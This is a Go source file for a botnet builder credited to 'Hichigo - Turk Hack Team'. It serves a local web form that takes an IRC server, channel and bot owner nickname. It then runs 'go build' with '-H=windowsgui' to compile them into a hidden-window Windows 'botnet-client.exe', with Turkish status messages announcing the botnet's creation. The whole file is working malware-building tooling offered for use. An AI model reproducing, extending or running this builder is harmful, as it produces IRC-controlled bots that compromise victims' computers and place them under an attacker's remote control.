package main

import (
	"fmt"
	"net/http"
	"os/exec"
)

var banner = `

	   ÛÛÛÛÛÛÛÛÛ           ÛÛÛÛÛÛ   ÛÛÛÛÛ           ÛÛÛÛÛ                   ÛÛÛÛ 
	  ÛÛÛ°°°°°ÛÛÛ         °°ÛÛÛÛÛÛ °°ÛÛÛ           °°ÛÛÛ                   °°ÛÛÛ 
	 ÛÛÛ     °°°   ÛÛÛÛÛÛ  °ÛÛÛ°ÛÛÛ °ÛÛÛ   ÛÛÛÛÛÛ  ÛÛÛÛÛÛÛ      ÛÛÛÛÛ ÛÛÛÛÛ °ÛÛÛ 
	°ÛÛÛ          ÛÛÛ°°ÛÛÛ °ÛÛÛ°°ÛÛÛ°ÛÛÛ  ÛÛÛ°°ÛÛÛ°°°ÛÛÛ°      °°ÛÛÛ °°ÛÛÛ  °ÛÛÛ 
	°ÛÛÛ    ÛÛÛÛÛ°ÛÛÛ °ÛÛÛ °ÛÛÛ °°ÛÛÛÛÛÛ °ÛÛÛÛÛÛÛ   °ÛÛÛ        °ÛÛÛ  °ÛÛÛ  °ÛÛÛ 
	°°ÛÛÛ  °°ÛÛÛ °ÛÛÛ °ÛÛÛ °ÛÛÛ  °°ÛÛÛÛÛ °ÛÛÛ°°°    °ÛÛÛ ÛÛÛ    °°ÛÛÛ ÛÛÛ   °ÛÛÛ 
	 °°ÛÛÛÛÛÛÛÛÛ °°ÛÛÛÛÛÛ  ÛÛÛÛÛ  °°ÛÛÛÛÛ°°ÛÛÛÛÛÛ   °°ÛÛÛÛÛ      °°ÛÛÛÛÛ    ÛÛÛÛÛ
	  °°°°°°°°°   °°°°°°  °°°°°    °°°°°  °°°°°°     °°°°°        °°°°°    °°°°° 

	  Yapımcı: Hichigo - Turk Hack Team     Oluşturma için lütfen bu adrese gidin ->  http://127.0.0.1:8000
`

func generateFunc(w http.ResponseWriter, r *http.Request) {
	if r.Method == "POST" {
		r.ParseForm()
		fmt.Printf("[+] POST DATA: %s %s %s\n", r.Form.Get("IRC_LINK"), r.Form.Get("IRC_CHANNEL"), r.Form.Get("IRC_NICK"))
		path, err := exec.LookPath("go")
    	if err != nil {
        	path = "go"
        	fmt.Println("[-] Go bulunamadı!")
    	} else {
    		fmt.Println("[+] Go bulundu!")
    	}
		fmt.Printf("[+] Girilecek Komut: %s %s %s %s %s %s %s %s",
			path, "build", "-ldflags",
			"-H=windowsgui", "-ldflags", "\"-X main.channel="+r.Form.Get("IRC_CHANNEL"),
			"-X main.serverssl="+r.Form.Get("IRC_LINK"),
			"-X main.botOwner="+r.Form.Get("IRC_NICK")+"\"\n")
		cmd := exec.Command(path, "build", "-ldflags",
			"-H=windowsgui", "-ldflags", "\"-X main.channel="+r.Form.Get("IRC_CHANNEL") + " " + 
			"-X main.serverssl="+r.Form.Get("IRC_LINK") + " " + 
			"-X main.botOwner="+r.Form.Get("IRC_NICK")+"\"")
		fmt.Fprint(w, "Lütfen konsol çıktısına bakınız!")
		stdoutStderr, err := cmd.CombinedOutput()
		if err != nil {
			fmt.Println(err)
		} else {
			fmt.Println("[+] BotNet'iniz 'botnet-client.exe' olarak kaydedildi")
		}
		fmt.Printf("%s\n", stdoutStderr)
		exec.Command("pause").Run()
	} else {
		fmt.Println(r.Method)
	}
}

func main() {
	fmt.Println(banner)
	http.HandleFunc("/generate/", generateFunc)
	http.Handle("/", http.FileServer(http.Dir("./web")))
	http.ListenAndServe(":8000", nil)
	//output,err := exec.Command("go","build","-ldflags","-H=windowsgui","-ldflags","\"-X main.channel=" + channel , "-X main.serverssl=" + address , "-X main.botOwner=" + ircuser + "\"").Output()
}
